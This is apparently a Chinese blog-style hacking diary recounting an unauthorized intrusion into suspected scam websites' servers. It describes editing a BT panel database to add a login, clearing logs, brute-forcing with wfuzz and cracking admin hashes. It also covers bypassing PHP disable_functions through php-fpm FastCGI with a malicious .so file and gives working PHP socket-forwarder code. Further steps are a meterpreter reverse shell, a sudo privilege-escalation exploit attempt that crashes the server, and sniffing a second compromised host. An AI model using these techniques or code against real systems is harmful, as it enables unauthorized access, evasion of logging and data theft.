 # 写的日记（就为了一吃的，然后为了吃的更好的咸鱼） 
 
 * 信息收集
# 宝塔后台
     首先想到的就是之前一直留着没进去的宝塔面板后台，里面应该会有些登录信息之类，但并没有得到登录密码，但这也并没有太大影响，
     因为现在可以直接访问宝塔的数据库文件（panel/data/default.db， sqlite数据库文件），所以直接进去备份个账户然后设置个密码，防止把正常账户挤下去：
      

![图片](https://user-images.githubusercontent.com/79394963/151659781-f08c8c28-f5d6-4060-b894-64357669d461.png)
![图片](https://user-images.githubusercontent.com/79394963/151659788-3812e174-21a6-4ce9-94d2-9d4255e8239f.png)

清理下日志，然后就是愉快的登录进去 ㄟ( ▔, ▔ )ㄏ：

![图片](https://user-images.githubusercontent.com/79394963/151659803-8e4d2105-120f-4260-b40f-250f56cc6653.png)
首先看到的就是账户名，想是管理员的手机号，这里看不全，去设置里面瞅瞅：

![图片](https://user-images.githubusercontent.com/79394963/151659813-fa778497-3798-48af-922a-05a9538518d1.png)

这里也是中间四位打了星号，从源码里也看不出，但这些也都是纸老虎，因为随后审查发现一处接口请求数据，返回信息里是完整的手机号，微信搜了下也有这个这么个账户：

![图](https://user-images.githubusercontent.com/79394963/151659835-34df9cfc-2717-42b9-9023-c0e477581a81.png)

新起点
在之后某个时间点准备继续收集信息的时候，发现其域名甚至IP都无法再访问了，后面几天试了也都不行，感觉可能是收割完一波然受卷款跑路了；自然，除了一些信息，之前获取的所有权限，都化作泡影了；也是在这之后，警察蜀黍竟主动联系了过来（没有喝茶，俺是良民 $_$），由于想着再碰碰运气看看，结果有趣的事再次发生了，
访问之前那个IP展示出了这么个页面


![图片](https://user-images.githubusercontent.com/79394963/151659868-382e6678-9f0c-4beb-b72e-b87455d0aee0.png)
![图片](https://user-images.githubusercontent.com/79394963/151659881-b7a19297-2f0a-4f7a-b048-33bf8fd5da60.png)
=_= 好吧，来都来了，就是个顺手的事；下面的分析也印证了上面的猜想，这也算是个IP反查域名 的小技巧，因为正常的工具比如 nslookup, dig 只能从域名到IP进行解析（某些有 ptr 的除外），但是遇到这种有使用 https 的站点，如果没有限制IP直接访问的话，能够正常进入页面，并且在浏览器左上角点击协议名还能查看所使用的证书，正常的证书的“颁发给”的值就是站点的域名，这里显然不是，应该是个临时或者测试证书：

这里发现通过公共DNS解析出来的IP，和前面用的好像对不上号，细想下，应该就是使用了 CDN服务，这些IP对应的服务器都是提供服务的三方机构的，渗透没太大意义，并且也不容易，这里辛亏是直接通过源站IP进入的，不然要通过域名和CDN检索出源站还是另一项头疼的活儿；

那么有了域名就来扫一波子域名，获取潜在的关联站：


![图片](https://user-images.githubusercontent.com/79394963/151659902-42681d30-c3d3-4875-b499-8e49d40cdfff.png)

![图片](https://user-images.githubusercontent.com/79394963/151659907-383a7b9b-9389-4e30-a5ea-e373b2ed8baf.png)

还是发现了一些熟悉的身影，依旧先后台跑着密码先吧，按以往的经验，遇到精明的主也许有漏网之鱼，所以还需要贴心的整套全端口扫描服务：


还是发现了一些熟悉的身影，依旧先后台跑着密码先吧，按以往的经验，遇到精明的主也许有漏网之鱼，所以还需要贴心的整套全端口扫描服务：

双赢？不存在的，只会是单方面的 ╮（╯＿╰）╭，简单分析了会儿页面，这里就暂时不用祭出神器了，直接用 wfuzz 跑一波账户密码：
先放后台跑着，去其他地方转转；一会儿后就看到了结果，哟西！进去瞅瞅：
提现那个就不说了，能否成功全看管理员心情，下面那个看不太明白也没关系，可能道理大家也都懂，反正就那么个意思，你的命运我掌控，你的风险我操纵 (¬‿¬)；

![图片](https://user-images.githubusercontent.com/79394963/151659934-f0b4708f-1f73-44d5-a34a-3bc30a4a2e14.png)


![图片](https://user-images.githubusercontent.com/79394963/151659938-e573936f-0e41-4046-a29a-e381e5638c9b.png)


往上遍历目录发现确实不简单，出现了之前的某些域名，难道是小站群，后面花了好一段时间才稍微搞懂他们的架构，多个二级域名指向当前IP，并拥有几个不同的CDN地址，然后某个二级域名又指向另一台服务器IP，当前IP的服务器呢又包含了另一个一级域名对应的二级域名，这几个站点又几乎在共享同一套代码，=_= 真够复杂的，难道是业务拓展导致的计划不周么，不过着也不重要，对应到服务器就行；
![图片](https://user-images.githubusercontent.com/79394963/151659958-a0829ee1-5384-4624-b4df-1ac01c18d27a.png)

账户和密码就简单了，可通过某些手段获取，只是可惜对方并不是配置的 root 账户，而是一个子账户，用站点命名，应该是服务器有多站点的缘故，权限也不高，先登录进去看下：

有个表存的管理员的信息，额这个表名（bulamao）……难道又要开始考验我对博大的中国文化熟悉程度了吗，我认输了，有知道的小伙伴可以评论下；表里面有串密码的哈希值，先拿去查一下碰碰运气：

![图片](https://user-images.githubusercontent.com/79394963/151659967-9427daac-a698-43ff-8d17-90b3ed047758.png)


地方不大，还挺热闹，对面都是大佬惹不起，似乎还有好几拨人，让它们安静的躺着，相爱相杀吧，俺啥都没看见 (x_x)；









![图片](https://user-images.githubusercontent.com/79394963/151659972-75fd8973-5a64-4076-81f0-d5457eb4fe7f.png)

不用说，多半一些系统执行函数被禁用了，就是 php 配置项中的 disable_functions 值，用于限制能在 php 脚本中执行系统命令的一些函数，当然也存在一些漏洞导致的绕过方法，途径不少，节约时间，就不挨个手工测试了，直接用现有的集成插件：

看到 putenv 被禁用心就凉了半截，光这就能劝退大部分绕过方式了，不过还是得试试，因为还剩一个方法可用（php-fpm），通过查看系统配置文件发现，fpm 模块使用的 socket 通信方式，配置一下然后启动：

这里面可利用的点就是，绕过通往 nginx 的请求，直接与 php-fpm 服务沟通，理想情况就是由于配置失误导致 9000 监听在了外网接口而不是本机接口，当然这种情况也是极少数，但这也并不意味着监听本机就无法利用了，在 php 程序文件可写的前提下，可以在程序中通过 curl 接口向服务器本机 9000 端口发起请求（或 stream_socket_client 发起套接字文件通信请求），并且是模仿 fastcgi 客户端发送对应格式的数据，这样就能实现绕过 nginx 直接与 php-fpm 沟通；这种操作还有另一种说法，叫 SSRF（Server-Side Request Forgery），即服务端请求伪造，通过服务器去实现访问客户端正常不能访问到的内网资源；当然还有一个和他名字很像的手段： CSRF（Cross-Site Request Forgery，跨站请求伪造），只不过这个是盗用其他客户端的登录凭证；

可能这里还有个问题，这样绕了一圈去建立通信，最后不是还是会通过 php-fpm 吗，这样配置的函数限制依然存在，其实不然，直接和 php-fpm 沟通的话，它是支持修改 php 配置的，就是 fastcgi 协议中的 PHP_VALUE, PHP_ADMIN_VALUE 这两个参数，比如可以设置这两个配置：

            "PHP_VALUE": "auto_prepend_file = php://input" 
            "PHP_ADMIN_VALUE": "allow_url_include = On"
            
  这会导致执行 php 程序之前包含 HTTP 中 POST 的数据，实现任意代码执行的目的，但即使这样也还是不行，因为这里的任意代码执行依然逃不开 php 配置文件的控制，所以就还需要更进一层，可以利用 extension 这个环境变量，设置执行脚本是要引入的动态链接库文件（Linux 下是 .so，Windows 下是 .dll）：

              "PHP_VALUE": "extension = /xxx/xxx.so" 

这就需要有任意文件上传权限，不过都开始研究限制绕过了，这点权限是肯定有的，然后就是编译构造自己的 .so 文件，并向其中添加要执行的系统命令，这样链接库文件在被引入的时候就会执行预定的命令，同时也不受 php 配置文件的限制；这个sao操作也是在研究那个插件代码时发现的 (¬‿¬)，同时也通过抓包找到了之前一直返回空数据的原因：

![图片](https://user-images.githubusercontent.com/79394963/151660091-55070b20-451b-4bca-b2f7-b15f61333a41.png)


原来插件一直在站点根目录读取配置的后门程序，之前为了掩人耳目是塞到了一个隐蔽的深层目录，所以一直获取不到数据返回空，也算是自己的配置失误，就是这里需要配置为后门程序所在目录：

![图片](https://user-images.githubusercontent.com/79394963/151660111-8c71f4dd-ceef-45fe-859c-f37764fd8c2e.png)

程指令执行
目前虽然可以通过插件绕过 disable_functions 并正常使用虚拟终端，但后续并不打算这么做，插件的机理其实就是通过包含 .so 时执行里面插入的指令，查看生成的 .so 文件可以看到插入了这样一条命令：

其实就是利用远程指令执行运行了另一个 php 服务，自定义了端口，并且 -n 参数是不使用 php 配置文件的意思，这样就实现了绕过 disable_functions，方便让其他程序畅通无阻的运行虚拟终端，手段确实有趣，不过这里就大可不必了，都能执行命令了还要虚拟终端干啥，另外经过测试也发现这样连接有一定时效性，大概一分钟左右就会断开连接，原因未知，所以为了后续更愉快的玩耍，直接上 msf payload，生成 elf-so 格式的文件后上传站点，然后把自定义的 fastcgi 客户端(https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)参数改下，让包含的 .so 文件为我们的 payload 文件以使其运行：


运行后就会得到构造后的 fastcgi 协议数据（TCP数据流），让服务器 php 发送它就好，所以还需要服务端写个 php 程序来配合发送，这是使用使用套接字文件通信时的文件内容：

<?php 
ini_set("display_errors", "On"); 
error_reporting(E_ALL); 
 
$fp = stream_socket_client("unix:///tmp/php-cgi-56.sock", $errno, $errstr, 30); 
$url = $_GET['url']; 
 
if (!$fp) { 
    echo "Errno: " . "$errstr ($errno)<br />\n"; 
} else { 
    try { 
        fwrite($fp, base64_decode($url)); 
        var_dump(fread($fp, 8192)); 
    } catch (Exception $e) { 
        print_r($e); 
    } 
    fclose($fp); 
} 
    如果是监听如果是监听本地 9000 端口，可以使用 fsockopen 协议来发送 fastcgi 协议数据，具体就是：

<?php 
ini_set("display_errors", "On"); 
error_reporting(E_ALL); 
 
$fp = fsockopen("127.0.0.1", 9000, $errno, $errstr, 30); 
$url = $_GET['url']; 
 
if (!$fp) { 
    echo "Error: $errstr ($errno)<br />\n"; 
} else { 
	try { 
	    fwrite($fp, base64_decode($_GET['url'])); 
		var_dump(fread($fp, 8192)); 
	} catch (Exception $e) { 
		print_r($e); 
	} 
    fclose($fp); 
} 

   然后打开 msfconsole 开启反向连接监听：

![图片](https://user-images.githubusercontent.com/79394963/151660165-f9d36cd1-7fcd-4d2f-8f38-b016d7ee18f8.png)
因为之前说这里的 php 建立的连接只有不到一分钟时间，.so 文件执行的指令也不例外，所以这里就到了争分夺秒考验手速的时刻了，先断开连接待会重来，然后这次需要准备第二个 payload 传到同目录下，为了节省时间可以在第一次连接前以后台任务运行（run -j）meterpreter 反向监听，这样就不会浪费时间再去切换 module 和设置 payload 再运行了：

外第二个 payload 的监听任务就会建立连接，并且是持续的长连接，第一个连接关掉也无所谓，后面就能愉快地进行其他操作了 (ง •_•)ง

Linux 提权（Privilege Escalation）
前面虽然已花了不少时间，但还没到达最关键的一步，现在才是重头戏，并且也不会太轻松，毕竟这是 Linux 系统，不同于 windows，版本和补丁数量不是特别高的话，提权漏洞一抓一把（这方面也稍微印证了 Linux 系统较于 Windows 更安全），少归少，不至于没有，只能逐个尝试；

Sudo Baron Samedit（cve-2021-3156）
记得今年（2021）年初正好报了一个 Linux sudo 程序的提权漏洞，正好试下：
Local Exploit Suggester
这里使用一下这款本地提权建议工具，它会自动获取相关系统信息并提供一些可利用的漏洞建议：

![图片](https://user-images.githubusercontent.com/79394963/151660221-3b00efaa-6bfc-445e-b8ff-318086127c6c.png)
但这些凭证的时间都很靠前，应该都失效了，而且在用自己的宝塔服务测试时发现，出了会话 cookie 时效为 2 小时外，软件似乎也对 csrf 这类漏洞做了限制，比如某个账户在一台电脑登录后，直接拿到浏览器存储的 cookie 信息然后放到另一台电脑中去伪造访问，不仅伪造的机子无法登录，原登录的机子也会自动退出登录；不过在分析时发现了另外一处 cookie 信息，里面似乎包含了宝塔面板的一些信息：
然后尴尬的事就发生了，执行了一段时间 exp 后，服务器就突然报错断开了，然后 IP 就一直超时再也连不上了，这个 Kernel panic ，也就是 Linux 系统的致命错误，如果没记错的话无限近似于 Windows 系统中断或蓝屏（难道不经意间让 exp 升级为 DOS 了……），当然也可能是运气不好对方又关站跑路了，那么就先这样吧，指不定后面谁又接盘了 (T_T)；

C段嗅探
鉴于这次攻克过于棘手，所以过程中曾对机器的所在网段进行过扫描，然后不小心拿下一台业务类似的，和这次的目标在同一网关管辖下，所以先后台嗅探着数据吧，后面有时间再看看收获；

![图片](https://user-images.githubusercontent.com/79394963/151660244-edafe052-f3f0-4764-8c82-97f164b34c8d.png)

      不要过分相信别人私下写的代码再呈现给你看的东西，即使它看起来是那样的真实，你所看到的只不过是对方想让你看到的罢了，对方既是规则的执行者也是制定者以及违背者。

                        
                    不过是三十年河东三十年河西般时事迁移，并无稳固之说。既不稳固，何必一定要放在心上。


